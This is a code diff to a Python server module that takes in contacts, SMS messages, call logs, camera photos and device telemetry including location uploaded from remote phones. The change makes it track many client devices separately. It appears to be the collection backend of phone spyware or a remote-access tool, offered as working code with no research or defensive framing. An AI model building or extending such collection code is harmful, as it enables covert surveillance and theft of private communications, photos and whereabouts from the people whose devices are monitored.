@@ -6,25 +6,25 @@ from typing import Any, Dict, List, Optional
 
 from app.config import settings
 from app.logger import log_event, log_info
-from app.state import state
+from app.state import state, ClientSession
 
 
-def save_contacts_data(data: bytes) -> Optional[str]:
+def save_contacts_data(client: ClientSession, data: bytes) -> Optional[str]:
     try:
         settings.storage_dir.mkdir(parents=True, exist_ok=True)
         dest = settings.storage_dir / "contacts.zip"
         dest.write_bytes(data)
-        state.latest_contacts = str(dest)
-        state.latest_contacts_bytes = data
+        client.latest_contacts = str(dest)
+        client.latest_contacts_bytes = data
         try:
             if zipfile.is_zipfile(io.BytesIO(data)):
                 with zipfile.ZipFile(io.BytesIO(data)) as zf:
                     if "contacts.json" in zf.namelist():
                         with zf.open("contacts.json") as f:
-                            state.contacts_list = json.loads(f.read().decode("utf-8"))
+                            client.contacts_list = json.loads(f.read().decode("utf-8"))
         except Exception:
             pass
-        log_event(f"contacts saved {len(data)} bytes to {dest}")
+        log_event(f"contacts saved {len(data)} bytes to {dest} ({client.id})")
         print(f"[contacts] saved {len(data)} bytes -> {dest}")
         return str(dest)
     except Exception as e:
@@ -33,8 +33,8 @@ def save_contacts_data(data: bytes) -> Optional[str]:
         return None
 
 
-def process_sms_data(messages: List[Dict[str, Any]], hours: int) -> List[Dict[str, Any]]:
-    state.latest_sms = messages
+def process_sms_data(client: ClientSession, messages: List[Dict[str, Any]], hours: int) -> List[Dict[str, Any]]:
+    client.latest_sms = messages
     try:
         settings.storage_dir.mkdir(parents=True, exist_ok=True)
         sms_file = settings.storage_dir / "latest_sms.json"
@@ -42,7 +42,7 @@ def process_sms_data(messages: List[Dict[str, Any]], hours: int) -> List[Dict[st
     except Exception:
         pass
     actual_hours = hours if hours > 0 else 24
-    log_event(f"sms received {len(messages)} messages (last {actual_hours}h)")
+    log_event(f"sms received {len(messages)} messages (last {actual_hours}h) from {client.id}")
     print(f"\n[sms] {len(messages)} messages (last {actual_hours}h):")
     for m in messages[:10]:
         direction = "<-" if m.get("type") == 1 else "->"
@@ -55,8 +55,8 @@ def process_sms_data(messages: List[Dict[str, Any]], hours: int) -> List[Dict[st
     return messages
 
 
-def process_call_logs_data(calls: List[Dict[str, Any]], hours: int) -> List[Dict[str, Any]]:
-    state.latest_call_logs = calls
+def process_call_logs_data(client: ClientSession, calls: List[Dict[str, Any]], hours: int) -> List[Dict[str, Any]]:
+    client.latest_call_logs = calls
     try:
         settings.storage_dir.mkdir(parents=True, exist_ok=True)
         call_file = settings.storage_dir / "latest_call_logs.json"
@@ -64,21 +64,21 @@ def process_call_logs_data(calls: List[Dict[str, Any]], hours: int) -> List[Dict
     except Exception:
         pass
     actual_hours = hours if hours > 0 else 24
-    log_event(f"call logs received {len(calls)} records (last {actual_hours}h)")
+    log_event(f"call logs received {len(calls)} records (last {actual_hours}h) from {client.id}")
     return calls
 
 
-def process_cams_data(cams: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+def process_cams_data(client: ClientSession, cams: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
     if not settings.enable_camera:
         return []
-    state.cameras = cams
-    log_event(f"detected cameras: {cams}")
+    client.cameras = cams
+    log_event(f"detected cameras for {client.id}: {cams}")
     for cam in cams:
         print(cam)
     return cams
 
 
-def save_photo_data(cam_id: str, data: bytes) -> Optional[str]:
+def save_photo_data(client: ClientSession, cam_id: str, data: bytes) -> Optional[str]:
     if not settings.enable_camera:
         return None
     try:
@@ -88,9 +88,9 @@ def save_photo_data(cam_id: str, data: bytes) -> Optional[str]:
         dest.write_bytes(data)
         latest_file = settings.storage_dir / "latest_photo.jpg"
         latest_file.write_bytes(data)
-        state.latest_photo = str(dest)
-        state.latest_photo_bytes = data
-        log_event(f"camera {cam_id} captured {len(data)} bytes saved to {dest}")
+        client.latest_photo = str(dest)
+        client.latest_photo_bytes = data
+        log_event(f"camera {cam_id} captured {len(data)} bytes saved to {dest} ({client.id})")
         print(f"[cam {cam_id}] saved {len(data)} bytes -> {dest}")
         return str(dest)
     except Exception as e:
@@ -99,7 +99,7 @@ def save_photo_data(cam_id: str, data: bytes) -> Optional[str]:
         return None
 
 
-def process_telemetry_data(header: Dict[str, Any]) -> Dict[str, Any]:
+def process_telemetry_data(client: ClientSession, header: Dict[str, Any]) -> Dict[str, Any]:
     data = {
         "battery": header.get("battery", {}),
         "network": header.get("network", {}),
@@ -108,13 +108,13 @@ def process_telemetry_data(header: Dict[str, Any]) -> Dict[str, Any]:
         "device": header.get("device", {}),
         "location": header.get("location", {}),
     }
-    state.latest_telemetry = data
+    client.telemetry = data
     try:
         settings.storage_dir.mkdir(parents=True, exist_ok=True)
         telem_file = settings.storage_dir / "latest_telemetry.json"
         telem_file.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
     except Exception:
         pass
-    log_event("telemetry updated from device")
-    print("[telemetry] updated from device")
+    log_event(f"telemetry updated from device {client.id}")
+    print(f"[telemetry] updated from device {client.id}")
     return data
